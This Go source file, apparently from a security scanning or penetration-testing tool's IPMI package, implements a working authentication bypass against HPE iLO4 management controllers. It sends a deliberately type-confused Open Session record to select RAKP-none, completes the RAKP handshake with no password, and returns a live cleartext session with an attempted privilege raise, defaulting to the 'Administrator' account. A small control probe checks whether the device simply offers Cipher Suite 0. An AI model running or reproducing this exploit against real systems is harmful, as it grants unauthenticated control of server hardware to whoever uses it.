package ipmi

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"time"
)

// iLO4 stores Open Session algorithms by position but validates each declared
// record type. Declaring the auth slot as confidentiality type 0x02 with algo 0
// selects RAKP-none while bypassing the normal auth-algo-0 rejection.

// iloRAKPNoneAuthRecord is the type-confused Authentication payload record:
//
//	[type=0x02(conf), rsvd, rsvd, len=0x08, algo=0x00, rsvd, rsvd, rsvd]
var iloRAKPNoneAuthRecord = [8]byte{0x02, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00}

// iloNormalAlgoZeroRecord is the honest auth-algo-0 record (declared type 0x00);
// used as the control that iLO4 rejects.
var iloNormalAlgoZeroRecord = [8]byte{0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00}

// iloOpenSessionRaw sends one RMCP+ Open Session Request carrying the given
// 8-byte authentication record (integrity=HMAC-SHA1, confidentiality=AES-CBC-128
// in the other two slots) and returns the response status byte plus the
// managed-system session ID (valid only when status==0).
func iloOpenSessionRaw(host string, port int, reqPriv byte, authRec [8]byte, timeout time.Duration) (status byte, bmcSID uint32, err error) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return 0, 0, err
	}
	defer c.Close()
	retries := session20HandshakeRetries(timeout)

	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	var os bytes.Buffer
	os.WriteByte(0x00)
	os.WriteByte(reqPriv & 0x0f)
	os.Write([]byte{0x00, 0x00})
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write(authRec[:])
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, 0x01, 0, 0, 0})
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, 0x01, 0, 0, 0})

	resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()), retries)
	if err != nil {
		return 0, 0, fmt.Errorf("open-session: %w", err)
	}
	pl, err := rmcpPlusPayload(resp)
	if err != nil {
		return 0, 0, err
	}
	if len(pl) < 2 {
		return 0, 0, errors.New("short open-session response")
	}
	status = pl[1]
	if status == 0 && len(pl) >= 12 {
		bmcSID = binary.LittleEndian.Uint32(pl[8:12])
	}
	return status, bmcSID, nil
}

// ILOAlgoZeroControlAccepted sends an honest auth-algo-0 Open Session (declared
// type 0x00) as the control. Acceptance means the box simply offers Cipher Suite 0,
// so a type-confused login proves nothing and the check stands down; an explicit
// rejection (status 0x04) or a dropped reply both leave the bypass meaningful. err
// is non-nil only when no reply arrived, and status is 0 in that case.
func ILOAlgoZeroControlAccepted(host string, port int, timeout time.Duration) (accepted bool, status byte, err error) {
	st, _, e := iloOpenSessionRaw(host, port, 0x04, iloNormalAlgoZeroRecord, timeout)
	if e != nil {
		return false, 0, e
	}
	return st == 0x00, st, nil
}

// OpenSession20ILORAKPNone establishes a live RMCP+ session against an iLO4 via
// the RAKP-none payload-type-confusion bypass, using no account password, only
// an enabled username (default "Administrator"). The returned session is active
// and driveable in cleartext; setSessionPrivilege has already been attempted for
// reqPriv. The caller owns Close().
func OpenSession20ILORAKPNone(host string, port int, username string, reqPriv byte, timeout time.Duration) (*Session20, error) {
	if strings.TrimSpace(username) == "" {
		username = "Administrator"
	}
	if reqPriv == 0 {
		reqPriv = 0x04
	}
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	handshakeRetries := session20HandshakeRetries(timeout)
	cmdRetries := session20CommandRetries(timeout)

	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		c.Close()
		return nil, err
	}

	// Open Session with the type-confused authentication record (algo None).
	var os bytes.Buffer
	os.WriteByte(0x00)
	os.WriteByte(reqPriv & 0x0f)
	os.Write([]byte{0x00, 0x00})
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write(iloRAKPNoneAuthRecord[:])
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, 0x01, 0, 0, 0})
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, 0x01, 0, 0, 0})

	osResp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("open-session: %w", err)
	}
	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("ilo rakp-none open-session: %w", err)
	}

	// RAKP Message 1 names the account and carries no password material.
	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(0x10 | (reqPriv & 0x0f))
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)

	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp1: %w", err)
	}
	// An auth-None RAKP2 carries no HMAC, so parse leniently (parseRAKP2 requires an
	// HMAC and would reject it). We only need status==0.
	r2pl, err := rmcpPlusPayload(r2Resp)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp2: %w", err)
	}
	if len(r2pl) < 2 {
		c.Close()
		return nil, errors.New("short RAKP2")
	}
	if r2pl[1] != 0x00 {
		c.Close()
		return nil, fmt.Errorf("rakp2 status=0x%02x (%s)", r2pl[1], rakpStatusText(r2pl[1]))
	}

	// RAKP Message 3 with no key-exchange auth code (the auth-None path).
	var r3 bytes.Buffer
	r3.WriteByte(0x00)
	r3.WriteByte(0x00)
	r3.Write([]byte{0, 0})
	_ = binary.Write(&r3, binary.LittleEndian, bmcSID)

	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0, r3.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp3: %w", err)
	}
	p, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, err
	}
	if len(p) < 2 || p[1] != 0x00 {
		c.Close()
		if len(p) >= 2 {
			return nil, fmt.Errorf("rakp4 status=0x%02x (%s)", p[1], rakpStatusText(p[1]))
		}
		return nil, errors.New("short RAKP4")
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: cmdRetries,
		username:   username,
		password:   "<ilo-rakp-none-bypass>",
		suite:      CipherAlgos{Auth: RAKPNone, Integrity: 0, Conf: 0},
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	// Auth None => no SIK/K1/K2; in-session commands go cleartext (payload 0x00).
	s.SetCommandProtection(protectionCleartext)
	// Best-effort raise to the requested privilege (bounded by the named account).
	_, _ = s.setSessionPrivilege(reqPriv & 0x0f)
	return s, nil
}
